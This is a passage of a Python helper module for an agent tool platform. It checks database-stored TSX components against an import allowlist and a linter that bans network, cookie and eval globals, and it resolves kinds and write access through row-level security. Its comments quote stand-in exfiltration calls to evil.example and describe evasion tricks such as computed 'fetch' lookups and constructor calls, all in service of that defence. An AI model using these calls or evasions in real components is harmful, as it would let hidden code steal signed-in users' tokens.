"""Shared helpers for the kind-registry authoring toolsets (``kind_*`` +
``kindcomp_*``).

Not a tool module — no tool functions live here. The two agent-facing modules
(``kind_authoring.py`` — the ``kind_*`` kind/schema/example/skill tools, and
``kind_component.py`` — the ``kindcomp_*`` component-code tools) both import
from here so resolution, authorization mirroring, schema inference, and
validation stay one implementation.

Authorization model
-------------------
RLS OWNS ACCESS; this module never re-implements it (chair ruling, 2026-09-27).
Every access question is put to Postgres in the CALLER'S OWN session
(``matrx_ai.tools.person_session`` → host ``acting_as_caller`` →
``rls_session``): a kind is viewable when ``content_ir.kind_definition``
returns its row to the person, and editable when ``SELECT ... FOR UPDATE``
returns it (the table's UPDATE policy answers). No owner comparison, no
``iam.has_access_for`` call, no org logic here — the policies carry public /
creator / internal+org-member / explicit grant / reachability. Levels:
reads = ``viewer``, writes = ``editor``. Slug resolution runs as the person
too, so another tenant's kinds never count toward (or leak through) an
ambiguity. Never widen this by writing rows with fabricated ``created_by`` /
``organization_id`` values.
"""

from __future__ import annotations

import asyncio
import copy
import logging
import os
import re
import shutil
from collections.abc import AsyncIterator
from contextlib import asynccontextmanager
from typing import Any
from uuid import UUID

from matrx_ai.db._registry import get_model as get_db_model
from matrx_ai.tools.models import ToolContext, ToolError, ToolResult

logger = logging.getLogger(__name__)

KIND_ENTITY_TOKEN = "content_ir_kind"
KIND_KEY = "__kind"

# ── Component enum constraints (mirror the DB CHECK constraints — a change
#    here is a migration, never a silent drift) ------------------------------
COMPONENT_PLATFORMS = ("web", "vite", "react-native", "chrome-extension", "desktop", "html-js")
# `loading` (2026-08-25) is the kind's LOADING FACE — what renders from the
# instant the kind is identified until the output component has a renderable
# frame. Authored per kind like any other component and fed the region's
# partial value each frame, so it can PERFORM the arrival instead of drawing a
# shapeless skeleton. Mirrors content_ir.kind_component_role_check.
COMPONENT_ROLES = ("output", "input", "loading")
CODE_SECTIONS = ("component_source", "props_transform")

# The ONLY routable input-role component key today. The frontend's Test form
# routes exclusively through it; custom input keys are refused by the FE.
GENERIC_INPUT_COMPONENT_KEY = "generic_structured"

# ── The rules for WRITING a component (props contract, kit, design bar, platform
#    component contracts, import list) live in ONE place: the `shape-authoring`
#    skill (common-docs/skills/shape-authoring/SKILL.md). It is attached to every
#    run that holds a kindcomp_* / kind_create tool (skill.definition
#    config.attach_with_tools). This module only ENFORCES (lints below); it never
#    restates the rules — a second copy is how the doctrine drifted (Arman 2026-10-11).
SHAPE_AUTHORING_SKILL = "shape-authoring"
SHAPE_AUTHORING_POINTER = "Follow the shape-authoring skill in your instructions."

# ── The component import allowlist.
#    CROSS-REPO MIRROR of matrx-frontend
#    features/agent-apps/utils/allowed-imports.ts (ALLOWED_IMPORTS_CONFIG) —
#    the ONE in-page compiler scope every DB kind component runs in. The
#    browser does NOT crash on an unknown import: it console.warns, skips it,
#    and the identifier resolves to undefined — so the component breaks at
#    RUNTIME with no incident. That is why unknown imports are refused HERE,
#    at write time. Change BOTH sides together.
COMPONENT_ALLOWED_IMPORTS: frozenset[str] = frozenset(
    {
        "react",
        "lucide-react",
        "recharts",
        "@/lib/utils",
        "@/components/official/icons/IconResolver",
        "@/components/agent-copy/CopyButtons",
        "@/components/agent-copy/CopyForAiButton",
        "@/components/Markdown",
        "@/components/markdown",
        "@/components/mardown",  # accepted typo variant — FE maps it too
        "@/components/MarkdownStream",
        # kind-kit — the registered, tested primitives (matrx-frontend
        # components/kind-kit, 2026-08-23). Kit first, hand-rolled never.
        "@/components/kind-kit/SortableList",
        "@/components/kind-kit/KindPanelGrid",
        "@/components/kind-kit/KindPanel",
        "@/components/kind-kit/KindActionButton",
        "@/components/kind-kit/KindImage",
        "@/components/kind-kit/KindHeaderBar",
        "@/components/kind-kit/StreamingSkeleton",
        "@/components/kind-kit/TagList",
        # @ai-matrx/code-runtime's documented scope registry (2026-10-06,
        # Applets AP-5): the primary UI set, icons, Applet parts, and the
        # heavy libraries loaded only when referenced.
        "@ai-matrx/design-system",
        "@ai-matrx/design-system/controls",
        "@ai-matrx/icons",
        "@/applets",
        "@ai-matrx/applets/react",
        "motion/react",
        "react-katex",
        "react-pdf",
        "xlsx",
        "@react-three/fiber",
        "three",
        "date-fns",
        "lodash",
    }
    | {
        f"@/components/ui/{name}"
        for name in (
            "button",
            "input",
            "textarea",
            "card",
            "label",
            "select",
            "slider",
            "switch",
            "tabs",
            "badge",
            "tooltip",
            "accordion",
            "collapsible",
            "progress",
            "separator",
            "scroll-area",
            "dialog",
            "sheet",
            "dropdown-menu",
            "table",
            "checkbox",
            "radio-group",
            "popover",
            "avatar",
            "alert",
            "skeleton",
        )
    }
)

_DATA_REFERENCE_RE = re.compile(r"\bdata\b")
_IMPORT_RE = re.compile(r"""^\s*import\s+(?:[^'"]*?\s+from\s+)?['"]([^'"]+)['"]""", re.MULTILINE)


def component_import_lint(source: str) -> str | None:
    """Refuse imports outside the frontend compiler's allowlist.

    The in-page compiler SKIPS unknown imports (console.warn) instead of
    failing, so the component mounts with undefined identifiers and breaks at
    runtime with no incident. Returns the refusal message, or None when every
    import is allowlisted."""
    if _DYNAMIC_IMPORT_RE.search(source or ""):
        return (
            "This component uses a dynamic import(). The in-page compiler has "
            "no module loader, so the call would either fail at render or "
            "reach code nobody vetted. Import from the allowlist at the top of "
            "the file instead."
        )
    unknown = sorted(
        {m for m in _IMPORT_RE.findall(source or "") if m not in COMPONENT_ALLOWED_IMPORTS}
    )
    if not unknown:
        return None
    return (
        f"Unknown import(s) {unknown}: the browser skips them silently and the "
        "component breaks at render. Import only paths listed in <available_imports> "
        f"of the {SHAPE_AUTHORING_SKILL} skill."
    )


# ── THE GLOBALS GATE (Q82 / B-17, 2026-09-11) ────────────────────────────────
# A DB-authored component is arbitrary TSX the browser compiles with
# `new Function` INSIDE the signed-in page's own origin. The import allowlist
# above says which modules it may pull; these lists say which browser globals it
# may name at all — because `fetch("https://evil.example", {body: token})` needs
# no import.
#
# THE LISTS ARE SHARED, not similar. The canonical copy is matrx-frontend
# `features/agent-apps/utils/component-source-gate.json`, and
# `tests/test_component_source_gate_parity.py` fails if these four constants
# ever stop being byte-identical to it. Edit the JSON and both runtimes
# together, never one of them.
COMPONENT_BANNED_GLOBALS: tuple[str, ...] = (
    "EventSource",
    "WebSocket",
    "XMLHttpRequest",
    "fetch",
    "importScripts",
    "localStorage",
    "sessionStorage",
)

# The evaluator — banned only where it is CALLED or CONSTRUCTED, because the
# bare word `Function` is a legal TypeScript type annotation and appears in live
# component bodies.
COMPONENT_BANNED_CALLABLES: tuple[str, ...] = ("Function", "eval")

# The same names reached as a PROPERTY (`window.fetch`, `document.cookie`,
# `navigator.sendBeacon`) — the obvious way around a bare-identifier ban.
# `localStorage`/`sessionStorage` are deliberately ABSENT: two live platform
# components persist per-viewer UI state through `window.localStorage`, and
# browser storage is not an exfiltration channel.
COMPONENT_BANNED_MEMBER_ACCESS: tuple[str, ...] = (
    "EventSource",
    "Function",
    "WebSocket",
    "XMLHttpRequest",
    "cookie",
    "eval",
    "fetch",
    "importScripts",
    "sendBeacon",
)

# DD-124 (2026-09-11). Three shapes this host ACCEPTED until now, all measured
# live: `import("https://evil.example/x.js")` (the import lint above only reads
# STATIC import statements, so dynamic import never touched it),
# `(()=>{}).constructor("return 1")` (the Function evaluator without the word
# Function), and `window["fet" + "ch"]` — which NO string rule can catch,
# because the banned name never appears in the source. The first two are name
# rules; the third is answered by refusing bracket access on the global roots
# outright. Zero of the 162 live component bodies use any of them (read-only
# scan, 2026-09-11), so none of this bans working code.

# Banned as a METHOD CALL on any value: `x.constructor(...)`. Reading
# `x.constructor.name` for a type label stays legal.
COMPONENT_BANNED_MEMBER_CALLS: tuple[str, ...] = ("constructor",)

# Roots that lose computed (bracket) property access entirely.
COMPONENT_BANNED_COMPUTED_ACCESS: tuple[str, ...] = ("globalThis", "self", "window")

# Syntax rules (not name lists) every runtime must implement, named so the three
# enforcement points can be compared. `dynamicImport` = `import(...)`.
COMPONENT_BANNED_SYNTAX: tuple[str, ...] = ("dynamicImport",)

_DYNAMIC_IMPORT_RE = re.compile(r"(?<![.\w$])import\s*\(")


def _banned_global_message(name: str) -> str:
    return (
        f'This component uses "{name}", which components stored in the database '
        "may not use. They run inside the signed-in page, so anything that "
        "reaches the network, browser storage, or the JavaScript evaluator "
        "could read or send the reader's data. Render what the Shape hands you "
        "in props.data and use a Shape action for anything the component needs "
        "from the server."
    )


def _banned_member_call_message(name: str) -> str:
    return (
        f'This component calls ".{name}(", which components stored in the '
        "database may not use. Calling a value's constructor reaches the "
        "JavaScript evaluator, so it could run code nobody reviewed inside the "
        "signed-in page. Write the logic out directly instead."
    )


def _banned_computed_access_message(name: str) -> str:
    return (
        f'This component uses "{name}[", which components stored in the '
        "database may not use. Looking a property up by a computed name hides "
        "which browser capability the component reaches, so no review can tell "
        "whether it is safe. Name what you need directly, and use props.data "
        "plus a Shape action for anything the component needs from the server."
    )


def component_globals_lint(source: str) -> str | None:
    """Refuse the globals that let a stored component read or send whatever the
    signed-in page can see. Returns the refusal message naming the offending
    global, or None when the source passes.

    The database backstops this with the same rule
    (`content_ir.kind_component_source_gate`, matrx-frontend migration
    `content_ir_kind_component_source_gate.sql`), so a write that slips past
    this function is still refused at the table."""
    code = source or ""
    for name in COMPONENT_BANNED_GLOBALS:
        if re.search(rf"(?<![.\w$]){re.escape(name)}\b", code):
            return _banned_global_message(name)
    for name in COMPONENT_BANNED_CALLABLES:
        escaped = re.escape(name)
        if re.search(rf"\bnew\s+{escaped}\s*\(", code) or re.search(
            rf"(?<![.\w$]){escaped}\s*\(", code
        ):
            return _banned_global_message(name)
    for name in COMPONENT_BANNED_MEMBER_ACCESS:
        if re.search(rf"\.\s*{re.escape(name)}\b", code):
            return _banned_global_message(name)
    for name in COMPONENT_BANNED_MEMBER_CALLS:
        if re.search(rf"\.\s*{re.escape(name)}\s*\(", code):
            return _banned_member_call_message(name)
    for name in COMPONENT_BANNED_COMPUTED_ACCESS:
        if re.search(rf"(?<![.\w$]){re.escape(name)}\s*\[", code) or re.search(
            rf"\.\s*{re.escape(name)}\s*\[", code
        ):
            return _banned_computed_access_message(name)
    return None


_ESBUILD_UNAVAILABLE_NOTE = (
    "esbuild is not installed on this host, so the TSX syntax gate was "
    "skipped — the code was accepted unverified."
)


def _esbuild_bin() -> str | None:
    """The esbuild binary this host provides, if any. Host installation is a
    deployment concern (the aidream Dockerfile installs the static binary);
    the package degrades to a loud skip when it is absent."""
    override = os.environ.get("MATRX_ESBUILD_BIN")
    if override and os.path.isfile(override):
        return override
    return shutil.which("esbuild")


async def tsx_compile_check(source: str) -> tuple[list[str], bool]:
    """Transpile the component TSX with esbuild and return
    ``(errors, checked)``. ``checked=False`` means no esbuild on this host —
    the caller must surface that loudly, never silently pass.

    This is a SYNTAX gate (the class of mistake the browser's Babel compile
    would throw on: unclosed JSX, stray braces, invalid TS). It executes
    nothing and resolves no imports — the import allowlist is
    ``component_import_lint``.
    """
    binary = _esbuild_bin()
    if not binary:
        return [], False
    try:
        proc = await asyncio.create_subprocess_exec(
            binary,
            "--loader=tsx",
            "--jsx=automatic",
            "--log-limit=8",
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.PIPE,
        )
        _, stderr = await asyncio.wait_for(proc.communicate((source or "").encode()), timeout=15)
    except Exception:  # noqa: BLE001 — a broken/hung binary degrades to "unchecked"
        logger.warning("esbuild syntax gate failed to run", exc_info=True)
        return [], False
    if proc.returncode == 0:
        return [], True
    text = (stderr or b"").decode(errors="replace").strip()
    errors = [line for line in text.splitlines() if line.strip()][:20]
    return errors or ["esbuild reported a syntax error with no message"], True


def component_source_lint(source: str) -> str | None:
    """Cheap hard gate against the silent-empty-render class: a component
    that never references ``data`` (``props.data``, destructured ``{ data }``,
    or the transform path — which also lands under ``props.data``) cannot
    possibly render the kind instance. Returns the refusal message, or None
    when the source passes."""
    source = source or ""
    # Lucide exports several names that are also JavaScript constructors
    # (Map, Set, WeakMap, WeakSet, Date, Error, Promise, RegExp). Importing one
    # under its bare name shadows the global inside the browser compiler. A
    # later `new Map(...)`, for example, then tries to construct the React icon
    # and crashes only at render time. Reject that ambiguous source at the
    # producer boundary; authors can alias the icon (`Map as MapIcon`) while
    # retaining the native constructor.
    lucide_imports = re.finditer(
        r'import\s*\{(?P<names>[^}]*)\}\s*from\s*["\']lucide-react["\']',
        source,
        re.DOTALL,
    )
    constructor_names = {
        "Map",
        "Set",
        "WeakMap",
        "WeakSet",
        "Date",
        "Error",
        "Promise",
        "RegExp",
    }
    for match in lucide_imports:
        for specifier in match.group("names").split(","):
            parts = [part.strip() for part in specifier.strip().split(" as ")]
            local_name = parts[-1] if parts else ""
            if local_name in constructor_names and re.search(
                rf"\bnew\s+{re.escape(local_name)}\s*\(", source
            ):
                return (
                    f"Lucide icon `{local_name}` shadows the JavaScript "
                    f"`{local_name}` constructor used by `new {local_name}(...)`. "
                    f"Alias the icon import (for example, `{local_name} as "
                    f"{local_name}Icon`) and use `<{local_name}Icon />` in JSX."
                )

    if _DATA_REFERENCE_RE.search(source):
        return None
    return (
        "Component never reads props.data, so it would mount empty with no error. "
        "Destructure { data } and read every field from it — see <props_contract> "
        f"in the {SHAPE_AUTHORING_SKILL} skill."
    )


def err(error_type: str, message: str, suggested: str | None = None) -> ToolResult:
    return ToolResult(
        success=False,
        error=ToolError(error_type=error_type, message=message, suggested_action=suggested),
    )


def ctx_user_id(ctx: ToolContext) -> str | None:
    try:
        raw = ctx.user_id
    except Exception:
        return None
    return str(raw) if raw else None


def ctx_org_id(ctx: ToolContext) -> str | None:
    try:
        raw = ctx.organization_id
    except Exception:
        return None
    return str(raw) if raw else None


def ctx_is_admin(ctx: ToolContext | None) -> bool:
    """True only for a platform admin acting from the ADMIN SYSTEM — the ONE
    admin-reach question, ``matrx_connect.admin_lane_active``: the request rode
    the host-verified admin-lane header (every admin-app page — "Edit with agent"
    included — sends it; the host re-checks ``admin.admins`` and audits) or was
    started from an admin-mounted route / the admin MCP (``admin_surface``). An
    admin on a user page is an ordinary person (THE ADMIN LANE, 2026-09-25).

    ``admin_surface_active`` alone was the 2026-10-17 regression: an agent run from
    the admin app goes through the ordinary chat route, so only the header lane
    marks it, and every kind tool treated the super admin as a stranger.

    Fail-closed: no context, another actor than the tool's caller, or any error
    reads as non-admin. This gates the ``platform_kind`` mint path — never widen
    it to org-admin or any softer signal."""
    try:
        from matrx_connect import admin_lane_active

        user_id = ctx_user_id(ctx) if ctx is not None else None
        return admin_lane_active(user_id=user_id) if user_id else admin_lane_active()
    except Exception:  # noqa: BLE001 — fail closed
        return False


def asset_organization_id(kd: Any, ctx: ToolContext | None, *, system_job: bool = False) -> str | None:
    """The organization a kind's teaching assets (generated skill, render block) are written to.

    The RLS INSERT policy on ``skill.definition`` / ``agent.prompt_block`` lets a person
    write into an organization only when they have access to it (platform admins and the
    scheduler's admin lane excepted). A shape in the Matrx System org is therefore only
    writable there from an admin lane; an ordinary owner/editor of such a shape (RLS already
    let them edit the shape) gets the assets in THEIR OWN organization, never a refused
    insert that leaves the shape live with no teaching assets. Every other shape keeps its
    own organization."""
    kd_org = getattr(kd, "organization_id", None)
    if str(kd_org) != system_organization_id():
        return str(kd_org) if kd_org else None
    if system_job or (ctx is not None and ctx_is_admin(ctx)):
        return str(kd_org)
    return ctx_org_id(ctx) if ctx is not None else str(kd_org)


def system_organization_id() -> str:
    """The Matrx System org — the one home of platform-owned rows. Read from
    matrx-orm (the canonical constant, session/fallback.py) so there is exactly
    one copy of the id in the codebase."""
    from matrx_orm.session.fallback import SYSTEM_ORGANIZATION_ID

    return SYSTEM_ORGANIZATION_ID


def is_uuid(value: str) -> bool:
    try:
        UUID(value)
        return True
    except (ValueError, TypeError):
        return False


def normalize_kind_slug(name: str) -> str:
    """Same normalization the contract publisher uses for slugs
    (``matrx_graph.contract_kinds.contract_kind_slug``): lowercase,
    non-alphanumeric runs collapsed to ``_``, trimmed."""
    return re.sub(r"[^a-z0-9]+", "_", name.lower()).strip("_") or "unnamed"


# The one legal shape for a kind slug — enforced on every path that mints a
# slug, including NESTED child kinds (``collect_child_kind_fields`` used to
# take a marked child's ``__kind`` value verbatim, unnormalized: this is how
# PascalCase orphans like ``ResellAnalysis`` / ``ProductKnowledgeItem`` got
# minted — 2026-08-26 incident). ``normalize_kind_slug`` already guarantees
# this pattern for anything it processes; this is the loud, defensive check
# for the one caller (``kind_create``'s root slug) plus every child slug,
# which is now ALSO run through ``normalize_kind_slug`` first.
KIND_SLUG_PATTERN = re.compile(r"^[a-z][a-z0-9_]*$")


def validate_kind_slug_format(slug: str) -> ToolResult | None:
    """Refuse a slug that is not lowercase snake_case. Returns a ToolResult
    error, or None when the slug is fine."""
    if not slug or not KIND_SLUG_PATTERN.match(slug):
        return err(
            "validation",
            f"'{slug}' is not a valid kind slug — slugs must be lowercase "
            "snake_case, starting with a letter (pattern "
            f"{KIND_SLUG_PATTERN.pattern}).",
            "Rename it, e.g. 'ResellAnalysis' -> 'resell_analysis', "
            "'resellresearchreport' -> 'resell_research_report'.",
        )
    return None


# Slugs shadowed by the /shapes route's static segments (matrx-frontend
# app/(core)/shapes/{instances,new,admin}) — a kind with one of these slugs
# would be unreachable in the studio (static segments beat [kind]).
# CROSS-REPO MIRROR: matrx-frontend RESERVED_SHAPE_SLUGS beside
# SHAPES_ROUTE_BASE (studio constants). Change BOTH sides together.
RESERVED_KIND_SLUGS = frozenset({"instances", "new", "admin"})


async def resolve_kind(
    ref: str,
    ctx: ToolContext,
) -> tuple[Any | None, ToolResult | None]:
    """Resolve a kind by UUID or slug. Slug resolution prefers, in order:
    a row in the caller's active org, a row created by the caller, then a
    single remaining live row. Ambiguity is a loud error, never a guess.

    Returns ``(kind_definition_row, None)`` or ``(None, error_result)``.
    """
    KindDefinition = get_db_model("KindDefinition")
    ref = (ref or "").strip()
    if not ref:
        return None, err("validation", "Provide a kind slug or kind_definition_id.")

    from matrx_ai.tools.person_session import as_the_person

    # AS THE PERSON: a kind RLS hides from the caller is not found, and never
    # counts toward (or leaks through) a slug ambiguity.
    if is_uuid(ref):
        async with as_the_person():
            row = await KindDefinition.get_or_none(use_cache=False, id=ref)
        if row is None or row.deleted_at is not None:
            return None, err(
                "not_found",
                f"Kind {ref} was not found, or you do not have access to it.",
            )
        return row, None

    async with as_the_person():
        rows = [r for r in await KindDefinition.filter(kind=ref).all() if r.deleted_at is None]
    if not rows:
        return None, err(
            "not_found",
            f"No kind found with slug '{ref}'.",
            "Check the slug, or create it with kind_create.",
        )
    org_id = ctx_org_id(ctx)
    user_id = ctx_user_id(ctx)
    if org_id:
        org_rows = [r for r in rows if str(r.organization_id) == org_id]
        if len(org_rows) == 1:
            return org_rows[0], None
        if len(org_rows) > 1:
            return None, err(
                "validation",
                f"Multiple live kind rows share slug '{ref}' in your organization — "
                "this is a data defect. Pass the kind_definition_id instead.",
            )
    if user_id:
        mine = [r for r in rows if str(r.created_by or "") == user_id]
        if len(mine) == 1:
            return mine[0], None
    if len(rows) == 1:
        return rows[0], None
    return None, err(
        "validation",
        f"Slug '{ref}' matches {len(rows)} kinds across organizations. "
        "Pass the kind_definition_id to disambiguate.",
    )


async def kind_rls_allows(kind_id: str, level: str, ctx: ToolContext | None = None) -> bool:
    """Does Postgres, in the CALLER's RLS session, let them ``level`` this kind?

    ``viewer`` — the kind_definition row is returned to them.
    ``editor`` — ``SELECT ... FOR UPDATE`` returns it (the UPDATE policy answers).
    The question is asked in ``in_the_persons_lane(ctx)`` — the SAME session and
    admin lane the write would use — so the gate and the write can never disagree
    (2026-10-17: the gate asked without the lane and refused a super admin on the
    admin app before the admin-lane write was ever tried). The question is asked
    of the database, never answered here.
    """
    from matrx_ai.tools.person_session import person_may_change

    KindDefinition = get_db_model("KindDefinition")
    async with in_the_persons_lane(ctx):
        if level == "viewer":
            row = await KindDefinition.get_or_none(use_cache=False, id=kind_id)
            return row is not None
        return await person_may_change(KindDefinition, {"id": kind_id})


# ---------------------------------------------------------------------------
# WRITES AS THE PERSON (chair ruling 2026-09-27)
# ---------------------------------------------------------------------------
#: Certified tables (audit.summary.certified) the kind tools write IN THE
#: CALLER'S RLS SESSION — their policies and governance triggers decide.
KIND_TABLES_WRITTEN_AS_THE_PERSON = (
    "content_ir.kind_definition",
    "content_ir.kind_instance",
    "skill.definition",
    "agent.prompt_block",
)
#: 🚧 STILL WRITTEN ON THE PRIVILEGED CONNECTION (after the RLS-decided
#: ensure_can_edit_kind gate): these component tables are not yet certified —
#: their generated policies lack platform_admin_read and carry an unreachable
#: anon lane. They move into the person's session once the read-lane v2 lane
#: re-runs iam.apply_rls on them. Never widen this list; shrink it.
KIND_TABLES_PENDING_CANONICAL_RLS = (
    "content_ir.kind_component",
    "content_ir.kind_example",
    "content_ir.kind_edge",
    "content_ir.kind_surface",
    "content_ir.kind_component_incident",
)

_RLS_REFUSAL_MARKERS = ("row-level security", "permission denied", "42501")


class WriteRefused(Exception):
    """The database, in the caller's session, refused (or matched no row for) a write."""


def scheduler_identity_active() -> bool:
    """True only inside a scheduled system run (``scheduled_run_attribution`` installs this
    context: origin_class ``scheduled`` from source_app ``matrx-scheduler``). The one thing
    ``system_job`` is allowed to open the admin write lane for."""
    try:
        from matrx_connect.context.app_context import try_get_app_context

        ctx = try_get_app_context()
    except Exception:  # noqa: BLE001 -- fail closed
        return False
    return bool(
        ctx is not None
        and getattr(ctx, "origin_class", "") == "scheduled"
        and getattr(ctx, "source_app", "") == "matrx-scheduler"
    )


@asynccontextmanager
async def in_the_persons_lane(
    ctx: ToolContext | None, *, system_job: bool = False
) -> AsyncIterator[None]:
    """THE ONE session a kind tool both ASKS and WRITES in: the caller's RLS session,
    with the admin lane opened inside it when — and only when — ``ctx_is_admin(ctx)``
    (an admin in the admin system) or a verified scheduler ``system_job``. Every
    permission probe (``kind_rls_allows``, the instance gate) and every write
    (``writing_as_the_person``) goes through here, so a probe can never refuse what
    the write would allow, nor allow what it would refuse. The lane opens the
    database's admin ARMS only; RLS still checks the identity."""
    from matrx_ai.tools.person_session import as_the_person

    async with as_the_person():
        # ``system_job``: a scheduled platform job (the weekly shape refresh) runs as the
        # scheduler's operator identity, which has no admin SURFACE; it asks the database's
        # own admin arm explicitly. RLS still decides -- a non-admin identity is refused.
        if (system_job and scheduler_identity_active()) or ctx_is_admin(ctx):
            from matrx_orm import admin_lane

            async with admin_lane(database=get_db_model("KindDefinition")._database):
                yield
        else:
            yield


@asynccontextmanager
async def writing_as_the_person(
    ctx: ToolContext | None, *, system_job: bool = False
) -> AsyncIterator[None]:
    """Write to a certified kind table in the caller's RLS session.

    On an admin surface the admin lane is opened inside the same session, so the
    database's own admin arm (never this module) grants a platform mint. An RLS
    refusal leaves as ``WriteRefused``.
    """
    if system_job and not scheduler_identity_active():
        raise WriteRefused(
            "system_job writes are only for the scheduler's system identity; this caller is not one"
        )
    try:
        async with in_the_persons_lane(ctx, system_job=system_job):
            yield
    except WriteRefused:
        raise
    except Exception as exc:
        if any(marker in str(exc) for marker in _RLS_REFUSAL_MARKERS):
            raise WriteRefused(str(exc)) from exc
        raise


async def update_as_the_person(
    model: Any, row_id: str, ctx: ToolContext | None, *, system_job: bool = False, **values: Any
) -> None:
    """``update_where`` by id in the caller's session; no row changed = ``WriteRefused``."""
    async with writing_as_the_person(ctx, system_job=system_job):
        result = await model.update_where({"id": str(row_id)}, **values)
        if not int(getattr(result, "rows_affected", 0) or 0):
            raise WriteRefused(f"no row {row_id} was changed for this person")


def refused(noun: str, row_id: str, exc: Exception) -> ToolResult:
    return err(
        "no_access",
        f"You do not have permission to change {noun} {row_id}; nothing was changed.",
        f"The database refused the write for this person ({exc}).",
    )


async def can_access_kind(kind_row: Any, ctx: ToolContext, level: str) -> bool:
    """RLS's answer for the caller at ``level`` — no owner fast path, no app logic."""
    if not ctx_user_id(ctx):
        return False
    return await kind_rls_allows(str(kind_row.id), level, ctx)


async def ensure_can_edit_kind(kind_row: Any, ctx: ToolContext) -> ToolResult | None:
    if await can_access_kind(kind_row, ctx, "editor"):
        return None
    return err(
        "forbidden",
        f"You do not have edit access to kind '{kind_row.kind}' (id {kind_row.id}).",
        "Work on kinds you created, or kinds explicitly shared with you at editor level.",
    )


async def ensure_can_view_kind(kind_row: Any, ctx: ToolContext) -> ToolResult | None:
    """Viewer gate for every read tool. Denials are content-free — the same
    not-found shape a missing id produces, so unauthorized probes learn
    nothing about another tenant's kinds."""
    if await can_access_kind(kind_row, ctx, "viewer"):
        return None
    # Never echo row attributes here — when the caller probed by UUID, echoing
    # the slug would itself disclose another tenant's kind.
    return err(
        "not_found",
        "No accessible kind found for the given reference.",
        "Check the slug or id, or ask the owner to share the kind with you.",
    )


# ---------------------------------------------------------------------------
# Schema inference + validation
# ---------------------------------------------------------------------------


def infer_schema_from_sample(
    sample: Any, required_fields: list[str] | None = None
) -> dict[str, Any]:
    """Deterministically infer the WIRE JSON Schema (Draft 2020-12 subset) from
    a sample value. ``__kind`` keys are excluded — the wire shape is pure data;
    the BLOCK shape (markers declared) is derived separately by
    ``inject_kind_markers_into_schema``.

    Fields are OPTIONAL BY DEFAULT (the schema-evolution rule from
    KIND_DISTILLATION_LEDGER.md — an all-required inference made every later
    payload missing one optional field a permanent failure). ``required_fields``
    names the ROOT fields without which the shape is meaningless; it must be a
    subset of the root properties."""

    NULL_ONLY = {"type": "null"}
    PERMISSIVE = {"type": ["string", "number", "boolean", "object", "array", "null"]}

    def merge(a: dict[str, Any], b: dict[str, Any]) -> dict[str, Any]:
        """Union two inferred nodes — real samples carry heterogeneous list
        items (a nullable rating, an optional key on some items only), and a
        first-element-only inference rejected the kind's own example."""
        if not a:
            return b
        if not b:
            return a
        if a.get("type") == "object" and b.get("type") == "object":
            props = dict(a.get("properties") or {})
            for key, node in (b.get("properties") or {}).items():
                props[key] = merge(props[key], node) if key in props else node
            return {"type": "object", "properties": props, "additionalProperties": False}
        if a.get("type") == "array" and b.get("type") == "array":
            return {"type": "array", "items": merge(a.get("items") or {}, b.get("items") or {})}
        ta = a.get("type")
        tb = b.get("type")
        types: list[str] = []
        for t in ([ta] if isinstance(ta, str) else list(ta or [])) + (
            [tb] if isinstance(tb, str) else list(tb or [])
        ):
            if t and t not in types:
                types.append(t)
        if "object" in types or "array" in types:
            # A scalar/null on one item and a container on another — no honest
            # single node describes it; fall back to the permissive union.
            return dict(PERMISSIVE)
        if "integer" in types and "number" in types:
            types.remove("integer")
        return {"type": types[0] if len(types) == 1 else types}

    def build(node: Any) -> dict[str, Any]:
        if isinstance(node, dict):
            props = {k: build(v) for k, v in node.items() if k != KIND_KEY}
            return {
                "type": "object",
                "properties": props,
                "additionalProperties": False,
            }
        if isinstance(node, list):
            if not node:
                return {"type": "array", "items": {}}
            items: dict[str, Any] = {}
            for element in node:
                items = merge(items, build(element))
            return {"type": "array", "items": items}
        if isinstance(node, bool):
            return {"type": "boolean"}
        if isinstance(node, int):
            return {"type": "integer"}
        if isinstance(node, float):
            return {"type": "number"}
        if isinstance(node, str):
            return {"type": "string"}
        if node is None:
            return dict(NULL_ONLY)
        return {}

    def finalize(node: Any) -> Any:
        """A key that was ONLY ever null stays permissive (we learned nothing
        about it); a null seen beside a real type becomes a nullable union."""
        if not isinstance(node, dict):
            return node
        if node == NULL_ONLY:
            return dict(PERMISSIVE)
        if node.get("type") == "object" and isinstance(node.get("properties"), dict):
            return {**node, "properties": {k: finalize(v) for k, v in node["properties"].items()}}
        if node.get("type") == "array":
            return {**node, "items": finalize(node.get("items") or {})}
        return node

    if not isinstance(sample, dict):
        raise ValueError(
            "sample_data must be a JSON object (the canonical payload shape of the kind); "
            f"got {type(sample).__name__}."
        )
    schema = finalize(build(sample))
    if required_fields:
        props = schema.get("properties") or {}
        unknown = [f for f in required_fields if f not in props]
        if unknown:
            raise ValueError(
                f"required_fields {unknown} are not properties of the sample "
                f"(known: {sorted(props)})."
            )
        schema["required"] = sorted(set(required_fields))
    return schema


def ensure_root_marker(value: Any, slug: str) -> Any:
    """Return the value as a BLOCK-shape instance of ``slug``: ``__kind`` set
    (or corrected) as the FIRST key at the root, every nested marker kept
    verbatim. Pure — never mutates its input.

    One-shape doctrine (KINDS_EVERYWHERE_PLAN §4.2, 2026-08-20): the
    discriminator-carrying form IS the representation of a kind instance
    inside the platform. Stored examples carry it; stripping survives only at
    agent prompts and external egress."""
    if not isinstance(value, dict):
        return value
    out = {KIND_KEY: slug}
    for key, item in value.items():
        if key == KIND_KEY:
            continue
        out[key] = copy.deepcopy(item)
    return out


def collect_child_kind_fields(sample: dict[str, Any], root_slug: str) -> dict[str, dict[str, Any]]:
    """Find the ROOT-level fields of a marked sample whose values are nested
    kind instances — the composition ``kind_edge`` rows record.

    Returns ``{field_name: {"slug", "sample", "is_list"}}`` for every root
    field that is a ``__kind``-marked object, or a list whose dict elements
    are ``__kind``-marked. A list must be marked HOMOGENEOUSLY (one child slug)
    — mixed-slug lists raise, because one edge row records one child kind.
    Deeper nesting belongs to the child's own definition (created recursively).
    """

    def _normalized_child_slug(raw: str, field: str) -> str:
        # 🚨 SLUG HYGIENE (2026-08-26 incident): a child's `__kind` marker used
        # to be trusted verbatim — an agent-authored PascalCase marker
        # (`ResellAnalysis`, `ProductKnowledgeItem`) minted an orphan kind with
        # an illegal slug. Every child slug is now run through the SAME
        # normalization + format check as the root slug, and the marker in the
        # sample is rewritten to match so the stored example agrees with the
        # minted kind.
        normalized = normalize_kind_slug(raw)
        if validate_kind_slug_format(normalized) is not None or not normalized:
            raise ValueError(
                f"Nested kind marker '{raw}' on field '{field}' is not a valid "
                f"snake_case slug (normalized to '{normalized}'). Use lowercase "
